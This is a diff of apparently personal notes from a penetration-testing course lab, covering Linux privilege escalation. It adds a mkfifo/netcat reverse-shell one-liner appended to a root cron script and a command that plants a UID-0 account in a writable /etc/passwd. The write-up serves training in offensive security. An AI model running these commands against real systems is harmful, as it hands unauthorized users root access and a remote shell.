@@ -391,10 +391,22 @@ To start, let's take a look at cron jobs running in the cron.log file. We can do
 ![[Pasted image 20220726164159.png]]
 We can see a script labeled "user_backups.sh" is being run as root. Taking a look at the permissions of the file reveal that we have write access. 
 ![[Pasted image 20220726164327.png]]
-We can simply edit this script, appending a reverse shell. As the script is being run as root this reverse shell will also be run as root.
+We can simply edit this script, appending a reverse shell. As the script is being run as root this reverse shell will also be run as root. We can append this script with the "mkfifo" command, essentially creating a named pipe which contains the commands for our reverse shell.
+`echo "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.11.0.4 1234 >/tmp/f" >> user_backups.sh`
 
-
+Now we just need to wait for the job to run (every 5 minutes) and we will receive our reverse connection.
+![[Pasted image 20220726165546.png]]
 
 # 18.3.5 Insecure File Permissions: /etc/passwd Case Study
-**1. Log in to your Debian client with your student credentials and attempt to elevate your privileges by adding a superuser account to the **/etc/passwd file.**
+**1. Log in to your Debian client with your student credentials and attempt to elevate your privileges by adding a superuser account to the /etc/passwd file.**
+
+
+As the /etc/password file is world writable, privilege escalation is fairly straightforward. We simply need to append a new superuser with a hashed password and a UID/GID of 0. First, lets generate the password hash.
+`openssl passwd newpass`
+
+Then we append our new user with our generated password to the /etc/passwd file.
+`echo "dials:HMT7fWPZwTQ2Q:0:0:root:/root:/bin/bash" >> /etc/passwd`
+
+We can then switch to our new user via the `su` command and we should be root.
+![[Pasted image 20220726170059.png]]
 
